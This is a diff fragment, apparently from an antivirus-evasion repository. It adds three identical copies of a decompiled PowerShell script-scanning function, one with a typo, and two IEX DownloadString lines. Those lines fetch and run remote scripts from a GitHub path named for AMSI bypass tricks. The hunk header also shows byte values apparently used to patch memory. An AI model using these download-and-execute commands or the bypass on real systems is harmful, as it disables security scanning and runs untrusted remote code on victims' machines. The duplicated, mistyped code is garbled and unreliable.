@@ -23,6 +23,98 @@ $buf[0] = 0x66; $buf[1] = 0xb8; $buf[2] = 0x01; $buf[3] = 0x00; $buf[4] = 0xc2; 
 
 
 
+internal static string CheckSuspiciousContent(Ast scriptBlockAst)
+{
+IEnumerable<string> source = ScriptBlock.TokenizeWordElements(scriptBlockAst.Extent.Text);
+ParallelOptions parallelOptions = new ParallelOptions();
+string foundSignature = null;
+Parallel.ForEach<string>(source, parallelOptions, delegate(string element, ParallelLoopState loopState)
+{
+if (foundSignature == null && ScriptBlock.signatures.Contains(element))
+{
+foundSignature = element;
+oopState.Break();
+}
+});
+if (!string.IsNullOrEmpty(foundSignature))
+{
+return foundSignature;
+}
+if (!scriptBlockAst.HasSuspiciousContent)
+{
+return null;
+}
+Ast ast2 = scriptBlockAst.Find((Ast ast) => !ast.HasSuspiciousContent && ast.Parent.HasSuspiciousContent, true);
+if (ast2 != null)
+{
+return ast2.Parent.Extent.Text;
+}
+return scriptBlockAst.Extent.Text;
+}
+
+
+internal static string CheckSuspiciousContent(Ast scriptBlockAst)
+{
+IEnumerable<string> source = ScriptBlock.TokenizeWordElements(scriptBlockAst.Extent.Text);
+ParallelOptions parallelOptions = new ParallelOptions();
+string foundSignature = null;
+Parallel.ForEach<string>(source, parallelOptions, delegate(string element, ParallelLoopState loopState)
+{
+if (foundSignature == null && ScriptBlock.signatures.Contains(element))
+{
+foundSignature = element;
+oopState.Break();
+}
+});
+if (!string.IsNullOrEmpty(foundSignature))
+{
+return foundSignature;
+}
+if (!scriptBlockAst.HasSuspiciousContent)
+{
+return null;
+}
+Ast ast2 = scriptBlockAst.Find((Ast ast) => !ast.HasSuspiciousContent && ast.Parent.HasSuspiciousContent, true);
+if (ast2 != null)
+{
+return ast2.Parent.Extent.Text;
+}
+return scriptBlockAst.Extent.Text;
+}
+internal static string CheckSuspiciousContent(Ast scriptBlockAst)
+{
+IEnumerable<string> source = ScriptBlock.TokenizeWordElements(scriptBlockAst.Extent.Text);
+ParallelOptions parallelOptions = new ParallelOptions();
+string foundSignature = null;
+Parallel.ForEach<string>(source, parallelOptions, delegate(string element, ParallelLoopState loopState)
+{
+if (foundSignature == null && ScriptBlock.signatures.Contains(element))
+{
+foundSignature = element;
+oopState.Break();
+}
+});
+if (!string.IsNullOrEmpty(foundSignature))
+{
+return foundSignature;
+}
+if (!scriptBlockAst.HasSuspiciousContent)
+{
+return null;
+}
+Ast ast2 = scriptBlockAst.Find((Ast ast) => !ast.HasSuspiciousContent && ast.Parent.HasSuspiciousContent, true);
+if (ast2 != null)
+{
+return ast2.Parent.Extent.Text;
+}
+return scriptBlockAst.Extent.Text;
+}
+
+
+IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello2.ps1"); 
+
+
+
 
  
 IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello.ps1")
